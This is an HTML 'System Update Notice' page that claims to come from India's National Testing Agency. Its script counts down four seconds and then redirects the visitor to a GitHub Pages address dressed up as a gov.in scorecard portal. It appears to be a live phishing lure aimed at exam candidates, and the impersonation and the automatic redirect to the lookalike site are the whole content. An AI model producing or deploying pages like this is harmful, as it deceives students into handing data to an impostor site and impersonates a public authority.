<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Maintenance</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f3f4f6;
            color: #1f2937;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .notice-card {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1);
            padding: 40px 30px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            border-top: 6px solid #2563eb;
        }

        .status-icon {
            width: 56px;
            height: 56px;
            background-color: #eff6ff;
            color: #2563eb;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px auto;
            font-size: 28px;
        }

        h1 {
            font-size: 1.25rem;
            font-weight: 700;
            color: #111827;
            margin-bottom: 12px;
        }

        .message {
            font-size: 0.95rem;
            line-height: 1.6;
            color: #4b5563;
            margin-bottom: 28px;
        }

        .countdown-container {
            background-color: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 14px;
            font-size: 0.9rem;
            color: #334155;
            font-weight: 500;
        }

        #countdown {
            font-weight: 700;
            color: #dc2626;
            font-size: 1.05rem;
        }
    </style>
</head>
<body>

    <main class="notice-card">
        <div class="status-icon" aria-hidden="true">⚙️</div>
        <h1>System Update Notice</h1>
        <p class="message">
            This Page is Getting Updated By The official National Testing Agency© Servers Please Visit After some time.
        </p>
        <div class="countdown-container">
            Redirecting in <span id="countdown">4</span> seconds...
        </div>
    </main>

    <script>
        (function() {
            let timeLeft = 4;
            const countdownDisplay = document.getElementById('countdown');
            const targetUrl = "https://ntaneet-ug.github.io/scorecard.portal.gov.in/";

            const timer = setInterval(() => {
                timeLeft--;
                countdownDisplay.textContent = timeLeft;

                if (timeLeft <= 0) {
                    clearInterval(timer);
                    window.location.href = targetUrl;
                }
            }, 1000);
        })();
    </script>

</body>
</html>
